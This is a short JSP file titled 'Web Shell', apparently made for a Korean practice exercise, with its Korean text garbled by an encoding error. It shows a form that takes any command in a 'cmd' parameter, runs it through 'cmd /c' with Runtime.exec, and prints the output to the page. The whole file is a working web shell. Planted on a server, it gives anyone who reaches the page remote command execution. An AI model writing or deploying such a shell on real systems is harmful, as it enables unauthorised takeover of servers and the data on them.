<%@ page language="java" contentType="text/html; charset=EUC-KR"
	pageEncoding="EUC-KR"%>
<%@ page import="java.io.*"%>

<!DOCTYPE html>
<html>
<head>
<meta charset="EUC-KR">
<title>Web Shell</title>
</head>
<body>
	<h2>���� ���� �ǽ�</h2>
	<form action="./cmd.jsp" method="get" accept-charset="EUC-KR"
		style="height: 50px">
		<div class="form">
			<input type="text" name="cmd" placeholder="cmd ��ɾ �Է����ּ���"
				style="width: 600px" /> <input type="submit" />
		</div>
	</form>
	<br>
</body>
</html>
<%
	try {

	String cmd = request.getParameter("cmd");
	cmd = "cmd /c " + cmd;
	if (cmd == null || cmd.equals("")) {

	} else {
		Process child = Runtime.getRuntime().exec(cmd);
		out.print("�Է��� cmd ��ɾ� : ");
		out.print(cmd);
		out.print("<br/>");
		out.print("<br/>");
		BufferedReader br = new BufferedReader(new InputStreamReader(child.getInputStream(), "EUC-KR"));

		String c;

		while ((c = br.readLine()) != null) {

	out.print(c);

		}

		br.close();
		System.out.println();

		try {

	child.waitFor();

		} catch (InterruptedException e) {

	e.printStackTrace();

		}
	}

} catch (IOException e) {

	System.err.println(e);

}
%>
